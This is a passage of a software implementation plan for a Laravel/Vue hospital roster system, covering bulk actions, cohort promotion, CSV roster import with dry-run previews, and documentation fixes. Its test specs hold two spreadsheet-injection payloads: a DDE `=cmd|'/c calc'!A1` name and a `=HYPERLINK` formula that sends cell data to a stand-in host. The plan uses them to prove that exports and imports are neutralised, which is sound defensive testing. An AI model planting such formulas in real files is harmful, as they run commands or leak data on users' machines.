export has no numeric column where one leads, and an unescaped `-` is a live formula prefix.
Stated so a future maintainer with a numeric column knows to solve it by column type, not by
shortening the list.

- [ ] **Step 4: Verify and commit**

Expected: full suite **957 passed** (951 + 6, with one skipped — `npm run build`, then check the
run reports **1 skipped**, and that the skip is the named pairing test and nothing else. A skip
count above one means something else went quiet and must be found before proceeding).

```bash
git commit -am "feat: a spreadsheet this system writes cannot execute anything"
```

---

### Task 9: LV-02 — bulk operations over the whole selection

**Files:**
- Create: `app/Http/Requests/Admin/PersonBulkRequest.php`
- Modify: `app/Http/Controllers/Admin/PersonController.php`
- Modify: `routes/web.php`
- Modify: `resources/js/Pages/Admin/People.vue`
- Test: create `tests/Feature/Admin/PeopleBulkTest.php`

LV-02: *"People screens support multi-select bulk actions: set level, set status, resend
invitations, deactivate, export."* **Resend is P1c-2** (it is an account action needing AC-02's
endpoint) and the screen says so rather than shipping a dead button.

Findings 12 and 13 shape the whole task: authorize the **entire** selection before any mutation,
and make the last-administrator guard **set-aware**.

- [ ] **Step 1: Write the failing test**

`tests/Feature/Admin/PeopleBulkTest.php`:

- `test_the_whole_selection_is_authorized_before_any_write` — submit a selection where the last
  person is unauthorized; assert **nothing** changed for the first ones. This is
  `InvitationController::store():87-105`'s ordering, and finding 12 is why it cannot be an
  after-the-fact rollback: `ManagerScope::assertMayTarget()` audits then aborts, and inside a
  transaction the audit row unwinds with the abort, so the refused attempt vanishes from the
  trail;
- `test_deactivating_every_remaining_administrator_is_refused_as_a_set` — **the finding-13 case**.
  Two active administrators, both in one selection, bulk deactivate. Per-row checks each pass
  (each sees the other as "another active administrator"); the set-aware check refuses. Assert
  422 and that **both** remain active;
- `test_deactivating_all_but_one_administrator_is_allowed`;
- `test_bulk_set_level_uses_the_one_writer` — every affected person's history goes through
  `LevelAssignment` (assert via the provenance columns being populated, which only that writer
  sets);
- `test_bulk_set_level_reports_per_person_outcomes` — a selection containing one person who
  already holds the target level returns a report naming `skipped_same_level` for them and
  `assigned` for the rest, and the response surfaces it;
- `test_an_unknown_person_id_in_the_selection_is_a_422_not_a_silent_skip`;
- `test_a_duplicate_id_in_the_selection_is_collapsed_not_applied_twice`;
- `test_the_export_is_neutralised` — a person whose `full_name` is `=cmd|'/c calc'!A1` (a
  legitimate thing to store; the system must not refuse a name) exports as `'=cmd...`;
- `test_the_export_respects_contact_visibility` — a viewer who cannot see phone numbers gets a
  file with no Phone column at all, not a column of blanks. A blank column invites "the numbers
  are missing, let me get them another way";
- `test_bulk_writes_are_audited_as_one_summary_plus_one_row_per_person`.

- [ ] **Step 2: Run and watch it go red**

- [ ] **Step 3: The request**

`PersonBulkRequest` validates `action` against `Rule::in(['set_level', 'set_active', 'export'])`,
`ids` as `['required','array','min:1','max:500']`, `ids.*` as
`['integer', Rule::exists('people', 'id')]` — note `Rule::exists` runs on the raw query builder
and never sees the SoftDeletes global scope, which is **correct here** (a retired person may be
in a selection), and is stated in the rule's comment so the next reader does not "fix" it.
`level_id` is `required_if:action,set_level` plus `Rule::exists('levels','id')`; `active` is
`required_if:action,set_active` and boolean.

- [ ] **Step 4: The controller**

`PersonController::bulk(PersonBulkRequest $request)`, in this order — the order **is** the
feature:

1. load the whole selection with `withTrashed()`, ids de-duplicated;
2. **authorize every member of the set**, in a full pass, before any mutation;
3. run the **set-aware** guard: for `set_active` with `active = false`, compute the
   administrators that would remain active *after* the whole selection is applied, and refuse
   with a 422 on `ids` if that count reaches zero. Written as one query outside the loop, never
   as `isLastActiveAdministrator()` per row;
4. one `DB::transaction` applying every change, collecting a per-person outcome from
   `LevelAssignment`'s own return value (never from a guess made before the write);
5. **after** the commit, `AuditLog::record('person_bulk', 'action=<a>;n=<count>')` plus one row
   per person — Decision H's ordering, matching `applyRoleSet()`;
6. `back()->with('bulk_report', $outcomes)` so the screen shows what actually happened per
   person, not "Done."

`export` short-circuits to `Csv::stream()` before step 4 — it is a read, it takes no transaction,
and its columns are built from `PersonPresenter::many()` so contact visibility is enforced by the
same code that enforces it on screen rather than by a second copy of the rule.

- [ ] **Step 5: The screen**

`People.vue` gains a checkbox column, a "select all filtered" control (all *filtered*, never all
*loaded* — the two differ the moment the search box has text, and selecting invisible rows is how
a bulk deactivation surprises someone), a sticky action bar showing the selection count, and a
per-person outcome list rendered from `bulk_report`. A disabled "Resend invitations" control with
the title *"Arrives with the invitation work (AC-02)"* — visible so the screen matches LV-02's
described shape, disabled so it cannot lie.

- [ ] **Step 6: Verify and commit**

Expected: full suite **968 passed** (957 + 11).

```bash
git commit -am "feat: bulk actions that check the whole selection before touching any of it"
```

---

### Task 10: LV-03 — the annual promotion, with the target chosen by a human

**Files:**
- Create: `app/Support/Promotion.php`
- Create: `app/Http/Controllers/Admin/PromotionController.php`
- Create: `resources/js/Pages/Admin/Promotion.vue`
- Modify: `routes/web.php`
- Modify: `app/Console/Commands/AuditAnomalies.php`
- Modify: `resources/js/Layouts/AppLayout.vue`
- Test: create `tests/Feature/Admin/PromotionTest.php`
- Test: modify `tests/Feature/Identity/LevelLadderTest.php`
- Test: modify `tests/js/AppLayout.test.js`

**Owner Decisions 1 and 2 are this task.** Restated so the implementer needs no second document:

> **There is no terminal level and none is to be inferred.** `levels.terminal` and
> `Level::nextAfter()` were deliberately not built and a test pins their absence — do not
> reintroduce either. The operator picks **both** the source level and the target level from
> `Level::query()->internal()->active()->ordered()`. Nothing computes a target: not
> `display_order + 10`, not "the next level by order", not a fallback of any kind. A terminal
> marker fails silently in two directions — an unmarked top level advances a cohort into a level
> that does not exist, a wrongly-marked middle level graduates one a year early — and removing
> the inference removes the whole failure class.
>
> **`EXT` is outside the ladder and is never promoted.** `scopeInternal()` is what excludes it,
> from **both** the source list and the target list.

- [ ] **Step 1: Write the failing tests**

`tests/Feature/Admin/PromotionTest.php`:

*The decision, pinned:*
- `test_the_screen_offers_no_computed_target` — the props carry a `levels` list and **no**
  `suggested_target`, `next_level` or similarly named key. Assert with `$page->missing(...)` for
  each of those three names, so a later "helpful" addition fails a test rather than shipping;
- `test_ext_is_offered_as_neither_source_nor_target` — the offered list excludes every level with
  `external = true`, by predicate not by code;
- `test_promoting_into_an_external_level_is_refused_server_side` — offer and validation from one
  predicate: a hand-crafted POST naming `EXT` as the target is a 422, not a 200. Offer-equals-
  validation is the 2026-07-26 invariant, and a picker whose write side is looser than its offer
  is exactly what that audit restored;
- `test_the_same_level_on_both_ends_is_refused_as_a_no_op`;
- `test_a_backwards_promotion_is_allowed_and_says_so_in_the_preview` — R4 → R1 previews and
  commits. The system does not know that is wrong and must not pretend to; the preview states
  plainly that the target is lower in the order.

*The mechanics:*
- `test_the_preview_lists_the_cohort_with_no_write` — assert `person_levels` count unchanged;
- `test_the_preview_names_who_will_be_skipped_and_why` — a person already at the target, a person
  with a later closed span, a person on a retired account;
- `test_the_commit_is_one_transaction` — force a failure mid-set (a level made inactive between
  preview and commit) and assert **nothing** was written;
- `test_the_commit_re_derives_the_cohort_inside_the_transaction` — a person added to the source
  level between preview and commit is **not** silently swept in: the submitted id list is
  re-checked against a fresh cohort computed inside the transaction, the same discipline
  `UnitMerge::commit()` established in P1b for signoff collisions;
- `test_every_written_span_carries_the_batch_id_reason_and_actor`;
- `test_the_retire_cohort_action_deactivates_and_closes_spans_without_a_target_level` —
  Decision D's graduation path;
- `test_a_promotion_is_addressable_by_batch` — every row written by one promotion shares one
  `promotion_batch_id`.

*The audit:*
- `test_one_summary_row_plus_one_row_per_person` — exact counts;
- `test_the_audit_details_carry_ids_only` — regex-assert both formats; assert the level **code**
  appears nowhere in `audit_log.detail` (it is administrator-authored free text);
- `test_only_the_summary_action_is_on_the_anomaly_watch_list` — read
  `app/Console/Commands/AuditAnomalies.php`'s source and assert it contains `'person_promotion'`
  and does **not** contain `'person_level_change'`. Forty critical alerts for one routine annual
  act is an alert channel nobody reads on the forty-first.

In `tests/Feature/Identity/LevelLadderTest.php`, widen
`test_there_is_no_terminal_column_and_no_next_after_inference` to scan **`app/` as a whole**, not
just `Level.php`, for `nextAfter`, `'terminal'` and `->terminal`. P1c is the first plan with a
live reason to want the inference, so this is the first time the guard has anything to catch.

- [ ] **Step 2: Run and watch them go red**

- [ ] **Step 3: `App\Support\Promotion`**

Two public methods and no state:

```php
    /**
     * @return array{cohort: list<array{person_id:int, name:string, outcome:string}>, batch:string}
     *
     * The PREVIEW. Computes, for every active person currently at `$from`, what `assign()` WOULD
     * return — by asking the same questions LevelAssignment asks, in the same order. It does not
     * write, and it does not guess: a preview whose outcomes are derived differently from the
     * commit's is a preview that lies on exactly the rows that matter.
     */
    public static function preview(Level $from, ?Level $to, string $effectiveFrom): array

    /**
     * The COMMIT. Re-derives the cohort INSIDE the transaction and intersects it with the
     * submitted id list, so a person added to the source level between preview and commit is not
     * silently swept in and one removed does not 404 the whole run. Same discipline as
     * UnitMerge::commit()'s fresh-plan re-check (P1b Task 5).
     *
     * Writes nothing but `person_levels` (through LevelAssignment) and `people.active` (for the
     * retire-cohort path). NEVER touches `users` — see RosterNeverMintsCredentialsTest.
     *
     * Audits NOTHING. The caller writes one summary row plus one row per person AFTER this
     * returns and the transaction has committed: AuditLog::record() opens its own transaction and
     * locks the chain tail, so N of them nested inside this one serialise the whole chain and
     * unwind with it on rollback. Same ordering as AccessControlController::applyRoleSet().
     */
    public static function commit(Level $from, ?Level $to, string $effectiveFrom, array $ids, array $context): array
```

The cohort predicate is written **once**, table-qualified (finding 7), and used by both:

```php
    /** @return \Illuminate\Database\Eloquent\Builder<Person> */
    private static function cohort(Level $from, string $on): Builder
    {
        return Person::query()
            ->where('people.active', true)
            ->whereHas('levels', fn ($q) => $q
                ->where('person_levels.level_id', $from->getKey())
                ->whereDate('person_levels.effective_from', '<=', $on)
                ->where(fn ($i) => $i->whereNull('person_levels.effective_to')
                    ->orWhereDate('person_levels.effective_to', '>=', $on)))
            ->orderBy('people.full_name');
    }
```

- [ ] **Step 4: The controller and its pickers**

`PromotionController::index()` renders the source/target lists from **one** predicate, and
`store()` validates against the **same** one — the `SignoffPickers` discipline applied to a
picker whose mistake would move a whole cohort:

```php
    /** The ONE predicate. `EXT` is external and appears in neither list, per owner decision 2. */
    private static function offerableLevels(): \Illuminate\Database\Eloquent\Builder
    {
        return Level::query()->internal()->active()->ordered();
    }
```

`index()` passes `self::offerableLevels()->get()`; the FormRequest validates `from_level_id` and
`to_level_id` with `Rule::in(self::offerableLevels()->pluck('id')->all())` — **not**
`exists:levels,id`, which would accept `EXT` and any retired level. That is the exact shape of
the 2026-07-26 finding (`exists:users,id` let any account be named as an endorser), applied
before it can happen rather than after.

`effective_from` is `['required', 'date_format:Y-m-d']` and defaults on screen to the department's
`academic_year_start` when one is configured, rendered through `Calendar::label()` so the operator
sees the Hijri date too. The client computes nothing.

- [ ] **Step 5: The screen**

`resources/js/Pages/Admin/Promotion.vue`: two `<select>`s (source, target), a date field, a
"Preview" button, and a table of the cohort with a per-person outcome and a checkbox per row so
the operator can exclude someone. A second, separately-labelled **"Retire this cohort instead"**
action on the same preview (Decision D's graduation path) requiring its own confirmation — it is
never a value in the target `<select>` that happens to mean "out".

The commit button is disabled until a preview has been run for the currently-selected
source/target/date triple; changing any of the three clears the preview. A stale preview
committed against changed inputs is the failure mode this whole screen exists to prevent.

The nav gains a "Promotion" link behind `people.manage`, beside People, with a matching
`tests/js/AppLayout.test.js` assertion.

- [ ] **Step 6: The watch list**

In `app/Console/Commands/AuditAnomalies.php`, add to the single-occurrence array (`:83-94`):

```php
            'person_promotion' => 'a training-level cohort was promoted',
```

and **not** `person_level_change` — Decision H, with the reason stated in a comment at the site
so a later reader does not "complete" the pair.

- [ ] **Step 7: Verify and commit**

Expected: full suite **986 passed** (968 + 18). `LevelLadderTest` green with its widened scan.

```bash
git commit -am "feat: a cohort moves up when a human says where to"
```

---

### Task 11: ST-04 part one — the reader port, its CSV adapter, and the fixtures

**Files:**
- Create: `app/Support/Roster/RosterReader.php`
- Create: `app/Support/Roster/CsvRosterReader.php`
- Create: `tests/fixtures/roster/*.csv` *(seven files, listed below)*
- Test: create `tests/Feature/Roster/CsvRosterReaderTest.php`
- Test: modify `tests/Feature/Build/CsvInjectionTest.php` *(remove the Task 8 skip)*

**Owner decision 3 is this task and the next.** Restated so the implementer needs no second
document:

> The import is built and tested **against synthetic fixtures only**. No real staff list enters
> the repository. The fixtures deliberately exercise duplicate emails, a person already on the
> roster, missing required columns, mixed-case and whitespace-padded headers, an unknown level
> code, Arabic names, and a row that would collide with an existing account. **The dry-run
> preview is a requirement, not a nicety: the first real import must hold no surprises.**

Decision E is why the reader is a port: there is no spreadsheet package in `composer.lock`, and
adding one to a system holding children's PHI is the owner's supply-chain decision.

- [ ] **Step 1: The fixtures**

Create `tests/fixtures/roster/` with seven files. Every name is invented; every address is on
`example.test`, which is reserved and cannot resolve.

| File | What it proves |
|---|---|
| `clean.csv` | The happy path: eight rows, headers `Full Name,Short Name,Email,Phone,Position,Level,Joined` — two of them Arabic (`نورة الحربي`, `عبدالله القحطاني`), one with a blank optional phone, one with a blank email. |
| `messy-headers.csv` | The same eight rows with headers `  full name ,Short_Name,EMAIL,phone,Position,level,joined at` — mixed case, padded, underscored, one renamed. Column mapping is what this file exists for. |
| `duplicate-emails.csv` | Two rows sharing `noura@example.test` with **different** names. `people.email` is UNIQUE outright, so row-by-row validation passes both and the insert 23000s. Must be caught **before** any write. |
| `duplicate-short-names.csv` | The same trap on `short_name`, which is also UNIQUE outright and is the column most likely to collide in a real hospital list ("A. Ali" twice). |
| `already-on-roster.csv` | Three rows whose emails match people the test seeds first — an **update**, not a duplicate. `Person::matchByEmail()` is the one matcher and this proves the importer uses it. |
| `collides-with-an-account.csv` | One row whose email belongs to a person **with a claimed account**, and whose Full Name differs. The import must not silently rename an account holder from a spreadsheet. |
| `broken.csv` | Missing the `Full Name` column entirely; one row with an unknown level code `PGY7`; one row with an unparseable `Joined` value `31/02/2026`; one row that is entirely blank; one cell beginning `=HYPERLINK("http://x/?"&A1)`. |

Add an eighth, `latin1.csv`, written in ISO-8859-1 with an accented name, to prove the encoding
refusal — see Step 3. It is generated by the test rather than committed as a binary blob, so a
future editor's UTF-8-normalising IDE cannot silently repair it.

- [ ] **Step 2: Write the failing test**

`tests/Feature/Roster/CsvRosterReaderTest.php`:

- headers are returned in file order, trimmed, with the BOM stripped from the first one — the BOM
  attaching itself to the first header is the single most common CSV-import bug and it makes
  `Full Name` fail to match with no visible difference on screen;
- `clean.csv` yields eight rows keyed by the original header text;
- `messy-headers.csv` yields the same eight rows after mapping;
- tab-delimited input is detected (the delimiter is sniffed from the header line: whichever of
  `,` `\t` `;` yields the most fields);
- CRLF line endings produce no trailing `\r` in the last cell of each row;
- Arabic content is byte-identical to the fixture;
- **`latin1.csv` throws with a message naming the fix**, and does not yield a single row. This is
  the case Decision E calls out: Excel's plain "CSV" export uses the system codepage, Arabic
  becomes mojibake, and mojibake imports *successfully* and is then wrong forever;
- a cell beginning `'=` comes back as `=` — the `Csv::neutralise()` pairing (Decision F);
- a cell beginning `'` that is **not** followed by a dangerous character keeps its apostrophe
  (`'Abd` stays `'Abd`, which is a real transliteration and would otherwise be corrupted);
- a file over the row cap (`MAX_ROWS = 2000`) throws rather than streaming forever.

Then remove the `markTestSkipped` from `CsvInjectionTest`'s pairing case (Task 8, Step 1).

- [ ] **Step 3: The port and the adapter**

```php
<?php

namespace App\Support\Roster;

/**
 * ST-04's reader, as a PORT (P1c Decision E).
 *
 * There is no spreadsheet package in composer.lock and adding one to a system holding children's
 * PHI is the owner's supply-chain decision, not a developer's. So CSV/TSV ships on PHP core, and
 * xlsx becomes ONE class implementing this interface plus one composer line and an explicit
 * "ext-zip": "*" (zip is already installed in the image at Dockerfile:76, in CI at ci.yml:30 and
 * locally) on the day the owner says so. Nothing in the preview, the validation report or the
 * commit path changes.
 */
interface RosterReader
{
    /** @return list<string> the header row, in file order */
    public function headers(): array;

    /** @return iterable<int, array<string, string>> data rows keyed by header text */
    public function rows(): iterable;
}
```

`CsvRosterReader` is built on `SplFileObject`. The parts that matter:

- **Encoding is checked over the whole file before a single row is parsed.**
  `mb_check_encoding(file_get_contents($path), 'UTF-8')` — false throws
  `RosterFormatException` with the message *"This file is not UTF-8. In Excel use File → Save As →
  **CSV UTF-8**; a plain CSV export writes Arabic names in a way this system cannot read
  correctly."* Refusing beats importing mojibake, because mojibake succeeds and is then wrong
  forever;
- the BOM is stripped from the first header only;
- headers are trimmed, and the caller maps them (Task 12) — the reader never guesses what a
  column means;
- `unNeutralise()` strips exactly one leading apostrophe when the next character is one of
  `Csv`'s six dangerous prefixes, and otherwise leaves the cell alone;
- `MAX_ROWS = 2000` and a `RosterFormatException` past it. A department has tens of staff; two
  thousand is a paste accident or a wrong file, and streaming it into a preview table is a
  browser hang rather than an error message.

- [ ] **Step 4: Verify and commit**

Expected: full suite **999 passed** (986 + 13), **0 skipped** — the Task 8 skip is now gone, and
a non-zero skip count means something else went quiet.

```bash
git commit -am "feat: a roster file the system can read without guessing at it"
```

---

### Task 12: ST-04 part two — dry run, validation report, commit

**Files:**
- Create: `app/Support/Roster/RosterImport.php`
- Create: `app/Http/Controllers/Admin/RosterImportController.php`
- Create: `app/Http/Requests/Admin/RosterImportRequest.php`
- Create: `resources/js/Pages/Admin/RosterImport.vue`
- Modify: `routes/web.php`, `resources/js/Layouts/AppLayout.vue`
- Modify: `tests/Feature/Build/ContactFieldsAreProjectedOnceTest.php` *(add the RosterImport allow-list line)*
- Test: create `tests/Feature/Admin/RosterImportTest.php`
- Test: create `tests/Feature/Build/RosterNeverMintsCredentialsTest.php`

Owner decision 3's second half: **the dry-run preview is a requirement.** A preview that says
"8 rows will be imported" and then does something else is worse than no preview, because it buys
confidence it has not earned.

- [ ] **Step 1: Write the failing tests**

`tests/Feature/Admin/RosterImportTest.php` — every fixture from Task 11 gets its own case, and
each asserts the **preview** and then the **commit** and that they agree:

- `clean.csv`: preview reports 8 creates, 0 updates, 0 errors; commit creates exactly 8 people
  and **0 users**; a second commit of the same file reports 8 updates and 0 creates
  (idempotence — the same discipline `LegacyImport` holds);
- `messy-headers.csv`: the mapping step is offered with a best-guess pre-selection, and a commit
  with the guesses accepted produces byte-identical results to `clean.csv`;
- `duplicate-emails.csv`: **the preview reports the collision and the commit is refused
  outright** — not "7 of 8 imported". Two rows disagreeing about who owns an address is a
  question about the source file, and the operator must answer it there;
- `duplicate-short-names.csv`: same shape, same refusal;
- `already-on-roster.csv`: preview reports 3 updates and names the fields that would change; a
  person's `full_name` is updated and their `people.id` is unchanged (matched through
  `Person::matchByEmail()`, the one matcher);
- `collides-with-an-account.csv`: **the row is reported and skipped, never silently applied.** A
  spreadsheet must not rename an account holder. The preview says which row and why;
- `broken.csv`: the missing required column is a **file-level** error that blocks the whole
  import (the operator has the wrong file, not a bad row); the unknown level code, the
  unparseable date and the blank row are **row-level** errors that report their line numbers and
  are skipped; the formula cell is stored as its literal text and never as a formula;
- `test_a_row_with_no_email_requires_an_explicit_new_person_confirmation` — finding from the P1
  plan's own item 4: `Person::matchByEmail()` returns null for a null address, so an ad-hoc
  external person bypasses the only matcher in the system. The importer refuses to auto-create
  an email-less row; the preview marks it *"no email — cannot be matched"* and requires a
  per-row tick. Where a `short_name` is present it is used as a secondary key (it is UNIQUE) and
  the preview says which key matched;
- `test_the_preview_writes_nothing` — row counts on `people`, `person_levels` and `users` all
  unchanged after a preview of every fixture;
- `test_the_commit_is_one_transaction` and `test_a_stale_preview_cannot_be_committed` — the
  commit re-reads the uploaded file and re-derives the report inside the transaction, comparing
  against a digest sent with the preview; a changed file is a 422;
- `test_the_import_never_creates_an_account` — `users` count unchanged across every fixture,
  including `collides-with-an-account.csv`;
- `test_an_oversized_upload_reports_the_size_not_a_missing_field` — **finding 9**. Simulate the
  empty-POST shape PHP produces past `post_max_size` (an empty `$_POST` with a non-zero
  `CONTENT_LENGTH`) and assert the message names the size limit. "The file field is required"
  for a 9 MB upload sends the operator looking for a missing form field;
- `test_the_import_is_audited_by_counts_only` — action `roster_import`, detail matching
  `/^created=\d+;updated=\d+;skipped=\d+$/`. No name, no address, no filename (a filename is
  frequently a person's name).

`tests/Feature/Build/RosterNeverMintsCredentialsTest.php` — Decision I's source-level guard over
`PersonController`, `PromotionController`, `RosterImportController` and `RosterImport`, for
`User::create(`, `DB::table('users')`, `->users()->create(` and `new User(`.

- [ ] **Step 2: Run and watch them go red**

- [ ] **Step 3: `RosterImport`**

One class, two entry points that share every rule:

```php
    /** @return array{file_errors: list<string>, rows: list<RosterRowReport>, summary: array<string,int>} */
    public static function preview(RosterReader $reader, array $mapping): array

    /** @return array{summary: array<string,int>, rows: list<RosterRowReport>} */
    public static function commit(RosterReader $reader, array $mapping, array $confirmations, Request $request): array
```

`commit()` calls the **same** analysis `preview()` calls, inside its transaction, and applies only
rows whose computed outcome is `create` or `update`. That is what makes the preview honest: it is
not a separate estimate, it is the same function.

The in-file duplicate check runs **before** any write, over the whole parsed set, on both
`email` (normalised through `Person::normalizeEmail()` — the one definition, finding 10) and
`short_name`. `people.email` and `people.short_name` are UNIQUE outright and two spreadsheet rows
sharing either pass row-by-row validation and 23000 on insert (P1 plan, P1c item 13).

Level codes resolve through `Level::query()->where('code', trim($value))->first()`; an unmatched
code is a row error naming the code and listing the valid ones. Levels are **not** created by an
import — the ladder is administrator-owned data (P1 owner decision 1) and letting a spreadsheet
invent one is how `PGY7` becomes a real level nobody chose. Where a level is present, the history
row is written through `LevelAssignment` (Task 6's single writer), never directly.

- [ ] **Step 4: The screen**

Three steps on one page: **upload → map columns → preview → commit.** The mapping step shows each
file header beside a `<select>` of destination fields, pre-selected by a case- and
whitespace-insensitive match, with `Full Name` marked required. The preview is a table with one
row per source row, its line number, its computed outcome (`create` / `update` / `skip` / `error`)
and, for updates, the fields that would change. A per-row tick for the confirmations the import
requires. The commit button is disabled until a preview exists, and any change to the file or the
mapping clears it.

The screen states plainly, above the file input: *"CSV or tab-separated, UTF-8. From Excel: File →
Save As → **CSV UTF-8**. Up to 4 MB and 2000 rows."* It does not silently reject an `.xlsx` with
"invalid file" — it names what it accepts.

`RosterImportRequest` validates `['file' => ['required', 'file', 'mimes:csv,txt,tsv', 'max:4096']]`
and, in `withValidator()`, detects the empty-POST shape (finding 9) to produce the size message
rather than a missing-field one.

- [ ] **Step 5: Add the allow-list line**

Add `'app/Support/Roster/RosterImport.php'` to `ContactFieldsAreProjectedOnceTest::ALLOW_LIST`
("writes `phone` from a spreadsheet column; renders none").

- [ ] **Step 6: Verify and commit**

Expected: full suite **1017 passed** (999 + 18).

```bash
git commit -am "feat: a roster import that shows its work before it does any"
```

---

### Task 13: Correct the documents this invalidates

**Files:**
- Modify: `docs/superpowers/specs/2026-08-08-munawib-endorsement-integration-design.md`
- Modify: `docs/spec/04-data-model.md`
- Modify: `docs/spec/08-foundation.md`
- Modify: `docs/spec/15-rulings.md`
- Modify: `docs/OPEN-DECISIONS.md`
- Modify: `docs/COMPLIANCE.md`
- Modify: `docs/PDPL-PACK.md`
- Modify: `docs/RUNBOOK-DEPLOY.md`
- Modify: `CLAUDE.md`
- Modify: `docs/superpowers/plans/2026-08-08-p1-master-rota.md`

Every claim below is **checked against the tree before it is written** — P1a's Task 9 amendment
records what happens when a documentation task is executed from the plan's own text rather than
from the code: two items were written as still-open questions that owner decisions had already
settled.

- [ ] **Step 1: The design doc**

- §5.1: `people.notes`/`phone` are `$hidden` **and** projected through
  `App\Support\PersonPresenter` under `App\Policies\PersonPolicy` — correct the implication that
  `$hidden` is the control (finding 2).
- §5.1: record that PE-01's "status" is **derived** (`active` × `hasAccount()`), never stored,
  and that `people.contact_visibility`'s home is `institutions`.
- §6.1: `person_levels` now carries `promotion_batch_id`, `reason`, `created_by`.
- §9: add a line recording that `people.manage` exists and what it is not (`users.manage`,
  `structure.manage`).
- §14 item 13 (AC-02 lifetime): **still unbuilt**, now explicitly scoped to **P1c-2**, not "P1c".
  Do not mark it closed.
- §14: add a new item — **xlsx roster import awaits a dependency decision** (Decision E), with
  the exact cost stated: one MIT package, one `composer.json` line, one `"ext-zip": "*"`, one
  adapter class, nothing else changes.
- §14: add a new item — **`Invitation::issue()`'s second email normalization** (finding 10)
  should collapse onto `Person::normalizeEmail()`; P1c-2 owns `Invitation`.

- [ ] **Step 2: The spec slices**

- `04-data-model.md`: an addendum for `people`'s operational layer and `person_levels`' three new
  columns — the slice predates all of it.
- `08-foundation.md`: verify lines 36 and 38 already carry `people.manage` from Task 1. If they
  do not, Task 1 was committed wrong and this is the moment it is caught.
- `15-rulings.md`: two post-launch rulings — *"Promotion target is chosen, never inferred"* and
  *"Contact visibility: `phone` behind a two-valued department setting, `notes` never"*.

- [ ] **Step 3: `docs/OPEN-DECISIONS.md`**

A new **DECIDED** section for P1c's Decisions A–I, and a new **STILL OPEN** entry for the xlsx
dependency with its cost. Do **not** re-open anything owner decisions have settled — that is P1a
Task 9's recorded mistake.

- [ ] **Step 4: Compliance and PDPL**

- `COMPLIANCE.md`: Task 2 already corrected the `$hidden` sentence; add the contact-visibility
  setting, its default, and the fact that `notes` is on neither side of it. Add the roster
  import as a new personal-data ingress point.
- `PDPL-PACK.md`: the DPIA was signed against a one-table identity model, and §3's note already
  says it needs re-signing for P0c's two tables. P1c adds a **screen** that displays staff
  contact data and a **bulk export** that removes it from the system in a file. Both belong in
  the re-signing note. **Flag for the owner, do not sign anything.**

- [ ] **Step 5: `CLAUDE.md` and the master plan**

- `CLAUDE.md`: one bullet under the identity rules — contact fields are projected by
  `PersonPresenter` alone, `$hidden` is not the control; and one under the non-negotiables —
  every CSV goes through `App\Support\Csv`.
- `2026-08-08-p1-master-rota.md`: amend the P1c scoping section the way P1b's amendment amends
  its own — leave the original as written, append what changed and why. Name the split (P1c-1 /
  P1c-2), the three items that moved (AC-02/03/04), and the two claims this plan found false
  (the `$hidden` claim; LV-02's "resend" being an account action).

- [ ] **Step 6: Verify and commit**

```bash
export PATH="/c/Users/ahmed/AppData/Local/php84:/c/Users/ahmed/AppData/Local/composer-bin:$PATH"
npm run build 2>&1 | tail -3
php artisan test 2>&1 | tail -3
```

Expected: **1017 passed**, unchanged — a documentation task that moves a test count has changed
behaviour.

```bash
git commit -am "docs: nine documents described a roster nobody could open"
```

---

## P1c-2 — Accounts *(scoped, not executable — its own plan when P1c-1 merges)*

Scoping, not implementation detail: enough to plan from, not enough to execute. This follows the
convention design §13 sets and P0a–P1b have followed.

1. **AC-02, the configurable invitation lifetime.** `Invitation::LIFETIME_DAYS = 7` stays the
   **default**; the value becomes admin-editable, validated (integer, ≥ 1, a sane upper bound —
   an invitation is a credential and the knob must not reach "never expires"), read through a new
   `Invitation::lifetimeDays()` that every issuer calls. Owner decision 5 (round 2, 2026-08-08)
   is binding: 7 stays the default, deliberately shorter than Munawib AC-02's 14, and the
   deviation is already recorded in design §14 item 13. Home: `app_settings` behind
   `settings.manage`, matching every other runtime knob — but note `AppSettings::KEYS` is an
   allow-list mapped onto framework config by `applyOverrides()`, and this key maps onto nothing,
   so the plan must decide whether to widen that class or give the setting its own home.
2. **AC-02, resend.** Singly and in bulk. Two real problems the P1 plan already named and neither
   is cosmetic: bulk resend has **nowhere to surface N one-time links** (the single-invite flow
   flashes the link exactly once because it is a bearer credential), and it works by mail alone,
   which is conditional on SMTP and whose failure `InvitationController::store()` deliberately
   swallows (`:120-129`). A bulk resend that silently mails nothing is a live possibility and
   needs designing against, not discovering.
3. **AC-02, claim status visible.** `openInvitations()` returns open invitations only (finding
   20), so accepted, revoked and expired ones render nowhere. The People screen is the natural
   home — per person, one of *no invitation / invited, expires <date> / expired <date> /
   claimed <date> / revoked <date>* — and it needs `invitations` to be queryable per person,
   which `invitations.person_id` (P0c, `2026_08_10_120005`) already makes possible.
4. **AC-03, unbinding.** An explicit, audited write that nulls `users.person_id` — **never** a
   lean on the `nullOnDelete` FK, which would leave an orphaned credential whose `position`,
   `full_name` and `member_email` accessors all silently return null and make
   `AccessControl::resolve()` resolve against a null position. The plan must **state what an
   unbound account resolves to** and prove it: most likely deactivate-and-unbind as one atomic
   act, since an account with no person is an account with no role.
5. **AC-04, per-person roles.** `user_capabilities` is keyed to the **account**, so a roster-only
   person can hold no grant. Moving it touches `AccessControl::resolve()`, `holdersOf()` and the
   cache key — a security-boundary change on a system holding PHI, deserving its own task, its
   own review and the 2026-07-26 "offered and validated from one definition" discipline.
6. **LV-02's bulk resend**, which P1c-1 ships as a visibly disabled control, and the `Users.vue`
   tidies P1c-1 deliberately left alone (`colspan="7"` on an eight-column table at `:364`;
   `bg-panel-soft` at `StaffPrivacyNotice.vue:25`).

Migrations: `2026_08_14_1201*` (a second series in the same day slot), so P1c-2 and P1d can be
planned and merged independently of one another without either renumbering.

---

## Definition of done

- [ ] `php artisan test` — **1017 passed**, 0 failures, **0 skipped**, run under Bash after
      `npm run build`.
- [ ] `npm test` — **113** (111 + Task 1's nav case + Task 10's nav case).
- [ ] `npm run build` green; `CompiledCssIsLightOnlyTest`, `TextContrastMeetsAaTest`,
      `CalendarIsTheOnlyConverterTest`, `CalendarWritersFlushTest` and
      `InstitutionProvenanceTest` all green.
- [ ] `PickerParityTest` green — D9's per-field parity survived PE-03 (Task 5's gate).
- [ ] `LevelLadderTest` green with its widened scan — no terminal column, no `nextAfter()`,
      anywhere in `app/`.
- [ ] The four new guard tests exist and are green: `ContactFieldsAreProjectedOnceTest`,
      `PersonLevelsHaveOneWriterTest`, `RosterNeverMintsCredentialsTest`, `CsvInjectionTest`.
- [ ] `users` row count is unchanged by every roster-import and promotion test in the suite.
- [ ] No `dark:` utility, no raw Tailwind palette class, no hex in any new markup, no
      `bg-panel-soft`.
